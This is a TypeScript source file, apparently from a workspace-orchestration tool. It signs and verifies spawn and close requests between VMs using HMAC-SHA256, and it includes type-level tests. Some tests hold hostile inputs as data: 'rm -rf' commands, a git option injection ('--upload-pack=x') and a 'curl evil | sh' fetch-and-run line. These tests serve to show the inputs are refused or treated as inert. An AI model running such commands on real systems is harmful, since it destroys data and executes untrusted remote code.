// A workspace starting another workspace in its own domain, and closing one it started
// (`desolate spawn`, `desolate close`, inside a workspace).
//
// WHO VOUCHES FOR A REQUEST. The request travels workspace -> its domain's outbox -> the
// root's ordinary user (rootd, then the state service) -> the host's daemon, which runs it.
// The root's ordinary user parses what every domain sends, so it is the part of the stack
// most exposed to a hostile domain. If the host ran whatever that user queued, a bug there,
// found by one domain, would be a way to run a command in ANOTHER domain's workspace: a path
// between domains (P5). So the root is not what vouches for a spawn. Each workspace VM has a
// key of its own, made by the host and written onto that VM's own disk (never a share): the
// VM and the host have it, the root and the other workspaces do not. A request is signed
// with it, and the host checks the signature against the key of the workspace the request
// says asked, in the domain whose outbox it arrived in. The root checks what it can (the
// domain's limit, the names) to answer early, and can drop a request, but cannot make one.
//
// The command is a list of words, run as an agent in the new workspace (agent-holder.py):
// never a line for a shell on the Mac. On the host it is only ever an argv element.
import { createHmac, timingSafeEqual } from "node:crypto";
import { isBranch, isSlug, parseRepo } from "./names.ts";
// In-source tests (suede.nests: `npm run test:nests`). Types only: erased when node runs this.
import type { Expect, Invoke, Table } from "../../suede.nests/dsl.import.meta.vitest.ts";

/** Where the VM's key is, inside the VM (and its devcontainer, which binds /run/desolate). */
export const IDENTITY_FILE = "/run/desolate/identity";
export const KEY = /^[0-9a-f]{64}$/;
export const MAC = /^[0-9a-f]{64}$/;
const NONCE = /^[0-9a-f]{32}$/;
/** How long a signed request stays good: the host refuses one older than this, and one it
 *  has already run. */
export const FRESH_MS = 15 * 60_000;
export const LIMIT = { words: 64, word: 16_384, total: 65_536 } as const;

/** The command a spawn runs, if it is one desolate will carry: words, no NUL (which no argv
 *  can hold), bounded. Anything else in a word (spaces, quotes, `$(...)`, a leading dash) is
 *  that word's text: nothing on the host reads it as more than an argv element. */
export const commandOf = (value: unknown): string[] | null => {
  if (!Array.isArray(value) || value.length > LIMIT.words) return null;
  let total = 0;
  for (const word of value) {
    if (typeof word !== "string" || word.length > LIMIT.word || word.includes("\0")) return null;
    total += word.length;
  }
  return total <= LIMIT.total ? (value as string[]) : null;
};

declare namespace commandOf {
  /** words, as they are; nothing a shell would read is special; no NUL; bounded */
  export type Cases = Table<
    typeof commandOf,
    [
      [
        args: [value: ["claude", "-p", "fix the docs; $(rm -rf ~)"]],
        expected: ["claude", "-p", "fix the docs; $(rm -rf ~)"],
      ],
      [args: [value: []], expected: []],
      [args: [value: ["a\u0000b"]], expected: null],
      [args: [value: "claude -p hi"], expected: null],
      [args: [value: [1]], expected: null],
    ]
  >;
}

export type Spawn = {
  op: "spawn";
  domain: string;
  parent: string;
  name: string;
  branch: string;
  checkouts: string[];
  command: string[];
  at: string;
  nonce: string;
};
export type Close = {
  op: "close";
  domain: string;
  parent: string;
  name: string;
  at: string;
  nonce: string;
};
export type Signed = Spawn | Close;

/** The exact bytes a signature covers: every field, in a fixed order, with its op. */
export const canonical = (r: Signed): string =>
  JSON.stringify(
    r.op === "spawn"
      ? [
          "desolate-spawn-v2",
          r.domain,
          r.parent,
          r.name,
          r.branch,
          r.checkouts,
          r.command,
          r.at,
          r.nonce,
        ]
      : ["desolate-close-v1", r.domain, r.parent, r.name, r.at, r.nonce],
  );

declare namespace canonical {
  /** every field, in a fixed order, under a name that says what is asked: a close's signature
   *  can never be taken for a spawn's */
  export type Spawn = Expect<
    Invoke<
      typeof canonical,
      [
        r: {
          op: "spawn";
          domain: "acme";
          parent: "w1";
          name: "helper";
          branch: "issue/9";
          checkouts: [];
          command: ["claude", "-p", "fix it"];
          at: "2026-11-16T00:00:00.000Z";
          nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
        },
      ]
    >,
    "=",
    '["desolate-spawn-v2","acme","w1","helper","issue/9",[],["claude","-p","fix it"],"2026-11-16T00:00:00.000Z","0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f"]'
  >;
  /** a close: its own name, and no command or branch to sign */
  export type Close = Expect<
    Invoke<
      typeof canonical,
      [
        r: {
          op: "close";
          domain: "acme";
          parent: "w1";
          name: "helper";
          at: "2026-11-16T00:00:00.000Z";
          nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
        },
      ]
    >,
    "=",
    '["desolate-close-v1","acme","w1","helper","2026-11-16T00:00:00.000Z","0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f"]'
  >;
}

/** A spawn's `--checkout`s, as `up` takes them: `<owner/repo>=main` or
 *  `<owner/repo>=worktree:<branch>`, at most 16; null if any is not one. (v2 of the signed
 *  form: v1 had no checkouts.) */
export const checkoutsOf = (value: unknown): string[] | null => {
  if (value === undefined) return [];
  if (!Array.isArray(value) || value.length > 16) return null;
  for (const c of value) {
    const m =
      typeof c === "string"
        ? /^([A-Za-z0-9_.-]{1,100}\/[A-Za-z0-9_.-]{1,100})=(main|worktree:(.+))$/.exec(c)
        : null;
    if (!m || !parseRepo(m[1]) || (m[3] !== undefined && !isBranch(m[3]))) return null;
  }
  return value as string[];
};

declare namespace checkoutsOf {
  /** up's own spellings, and nothing else */
  export type Cases = Table<
    typeof checkoutsOf,
    [
      [
        args: [value: ["acme/web=worktree:task/web", "acme/api=main"]],
        expected: ["acme/web=worktree:task/web", "acme/api=main"],
      ],
      [args: [value: undefined], expected: []],
      [args: [value: ["acme/web=worktree:-x"]], expected: null],
      [args: [value: ["acme/web"]], expected: null],
      [args: [value: ["../x=main"]], expected: null],
    ]
  >;
}

export const sign = (key: string, r: Signed): string =>
  createHmac("sha256", Buffer.from(key, "hex")).update(canonical(r)).digest("hex");

declare namespace sign {
  /** an HMAC-SHA256 of the canonical bytes under the workspace's key: the `mac` the tests of
   *  verify below carry */
  export type Mac = Table<
    typeof sign,
    [
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
          },
        ],
        expected: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045",
      ],
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "close";
            domain: "acme";
            parent: "w1";
            name: "helper";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
          },
        ],
        expected: "8afdad9b6b86af59b761143a9268740c156bd5c74cfd66c9d2572f1e8e122d80",
      ],
    ]
  >;
}

/** The request's fields, checked; null if any is not one desolate makes. */
export const parseSigned = (value: unknown): (Signed & { mac: string }) | null => {
  const v = (typeof value === "object" && value !== null ? value : {}) as Record<string, unknown>;
  if (
    !isSlug(v.domain) ||
    !isSlug(v.parent) ||
    !isSlug(v.name) ||
    typeof v.at !== "string" ||
    !/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d{1,3})?Z$/.test(v.at) ||
    typeof v.nonce !== "string" ||
    !NONCE.test(v.nonce) ||
    typeof v.mac !== "string" ||
    !MAC.test(v.mac)
  )
    return null;
  if (v.name === v.parent) return null;
  if (v.op === "close")
    return {
      op: "close",
      domain: v.domain,
      parent: v.parent,
      name: v.name,
      at: v.at,
      nonce: v.nonce,
      mac: v.mac,
    };
  if (v.op !== "spawn") return null;
  const branch =
    v.branch === undefined || v.branch === "" ? "" : isBranch(v.branch) ? v.branch : null;
  const command = commandOf(v.command ?? []);
  const checkouts = checkoutsOf(v.checkouts);
  if (branch === null || command === null || checkouts === null) return null;
  return {
    op: "spawn",
    domain: v.domain,
    parent: v.parent,
    name: v.name,
    branch,
    checkouts,
    command,
    at: v.at,
    nonce: v.nonce,
    mac: v.mac,
  };
};

declare namespace parseSigned {
  /** a spawn as a workspace sends it; a branch and checkouts left out are none */
  export type Spawn = Expect<
    Invoke<
      typeof parseSigned,
      [
        value: {
          op: "spawn";
          domain: "acme";
          parent: "w1";
          name: "helper";
          command: ["claude"];
          at: "2026-11-16T00:00:00.000Z";
          nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
          mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
        },
      ]
    >,
    "=",
    {
      op: "spawn";
      domain: "acme";
      parent: "w1";
      name: "helper";
      branch: "";
      checkouts: [];
      command: ["claude"];
      at: "2026-11-16T00:00:00.000Z";
      nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
      mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
    }
  >;
  /** a close carries no command: whatever else came with it is not kept */
  export type Close = Expect<
    Invoke<
      typeof parseSigned,
      [
        value: {
          op: "close";
          domain: "acme";
          parent: "w1";
          name: "helper";
          command: ["rm", "-rf", "/"];
          at: "2026-11-16T00:00:00.000Z";
          nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
          mac: "8afdad9b6b86af59b761143a9268740c156bd5c74cfd66c9d2572f1e8e122d80";
        },
      ]
    >,
    "=",
    {
      op: "close";
      domain: "acme";
      parent: "w1";
      name: "helper";
      at: "2026-11-16T00:00:00.000Z";
      nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
      mac: "8afdad9b6b86af59b761143a9268740c156bd5c74cfd66c9d2572f1e8e122d80";
    }
  >;
  /** read field by field before anything trusts it: a workspace naming itself, a name that is
   *  not a slug, a branch that is an option, a shell line for a command, an op that is not
   *  one, a time that is not an ISO instant, a mac that is not one */
  export type Refuses = Table<
    typeof parseSigned,
    [
      [
        args: [
          value: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "w1";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
        ],
        expected: null,
      ],
      [
        args: [
          value: {
            op: "spawn";
            domain: "../x";
            parent: "w1";
            name: "helper";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
        ],
        expected: null,
      ],
      [
        args: [
          value: {
            op: "spawn";
            domain: "acme";
            parent: "W1";
            name: "helper";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
        ],
        expected: null,
      ],
      [
        args: [
          value: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "--upload-pack=x";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
        ],
        expected: null,
      ],
      [
        args: [
          value: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            command: "rm -rf ~";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
        ],
        expected: null,
      ],
      [
        args: [
          value: {
            op: "exec";
            domain: "acme";
            parent: "w1";
            name: "helper";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
        ],
        expected: null,
      ],
      [
        args: [
          value: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            at: "yesterday";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
        ],
        expected: null,
      ],
      [
        args: [
          value: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "zz";
          },
        ],
        expected: null,
      ],
      [args: [value: null], expected: null],
    ]
  >;
}

/** The host's check: the signature is the parent workspace's, and the request is fresh.
 *  Returns why not, or null. */
export const verify = (
  key: string | null,
  r: Signed & { mac: string },
  now = Date.now(),
): string | null => {
  if (!key || !KEY.test(key))
    return `the host has no key for ${r.domain}/${r.parent}: it was not started by this host, or was removed`;
  const expected = Buffer.from(sign(key, r), "hex");
  const given = Buffer.from(r.mac, "hex");
  if (expected.length !== given.length || !timingSafeEqual(expected, given))
    return `the request is not signed by ${r.domain}/${r.parent}`;
  const at = Date.parse(r.at);
  if (!Number.isFinite(at) || now - at > FRESH_MS || at - now > 120_000)
    return "the request is too old (or from the future): ask again";
  return null;
};

declare namespace verify {
  /** the control: signed by the parent's key, a second after it was made */
  export type Good = Expect<
    Invoke<
      typeof verify,
      [
        key: "abababababababababababababababababababababababababababababababab",
        r: {
          op: "spawn";
          domain: "acme";
          parent: "w1";
          name: "helper";
          branch: "issue/9";
          checkouts: [];
          command: ["claude", "-p", "fix it"];
          at: "2026-11-16T00:00:00.000Z";
          nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
          mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
        },
        now: 1794787201000,
      ]
    >,
    "=",
    null
  >;
  /** the same request, with one thing changed as the root's ordinary user could in transit:
   *  another domain, another command, another workspace's key, no key */
  export type NotSigned = Table<
    typeof verify,
    [
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "spawn";
            domain: "beta";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794787201000,
        ],
        expected: "the request is not signed by beta/w1",
      ],
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["bash", "-c", "curl evil | sh"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794787201000,
        ],
        expected: "the request is not signed by acme/w1",
      ],
      [
        args: [
          key: "cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd",
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794787201000,
        ],
        expected: "the request is not signed by acme/w1",
      ],
      [
        args: [
          key: null,
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794787201000,
        ],
        expected: "the host has no key for acme/w1: it was not started by this host, or was removed",
      ],
    ]
  >;
  /** good for fifteen minutes, and for two minutes of a clock ahead of the host's: no longer */
  export type Fresh = Table<
    typeof verify,
    [
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794788100000,
        ],
        expected: null,
      ],
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794788100001,
        ],
        expected: "the request is too old (or from the future): ask again",
      ],
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794787080000,
        ],
        expected: null,
      ],
      [
        args: [
          key: "abababababababababababababababababababababababababababababababab",
          r: {
            op: "spawn";
            domain: "acme";
            parent: "w1";
            name: "helper";
            branch: "issue/9";
            checkouts: [];
            command: ["claude", "-p", "fix it"];
            at: "2026-11-16T00:00:00.000Z";
            nonce: "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f";
            mac: "400a01d1ee72388eba63ec5aa13aabc8cc5094db1771178ef10a9814951d4045";
          },
          now: 1794787079999,
        ],
        expected: "the request is too old (or from the future): ask again",
      ],
    ]
  >;
}
